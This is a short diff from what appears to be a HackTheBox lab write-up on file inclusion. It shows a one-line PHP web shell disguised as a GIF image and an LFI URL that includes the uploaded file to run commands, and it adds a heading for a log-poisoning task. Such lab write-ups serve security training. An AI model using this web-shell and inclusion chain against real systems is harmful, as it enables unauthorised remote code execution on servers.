@@ -56,3 +56,6 @@ Flowoing HTB Writeup first we create a basic php shell <code> echo '<?php system
 Using image upload first we create web shell file that we will use to upload as image <code>echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif</code> after successful upload we can use this URL <code>http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id</code> to start using comands to find our flag
   
 ![Screensh5ot 2024-11-18 220254](https://github.com/user-attachments/assets/5f7aeeb2-4375-433c-a5a5-5323f52eee8b)
+
+<h1><ins>Log Poisoning</ins></h1>
+<h2>Task: Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd/</h2>
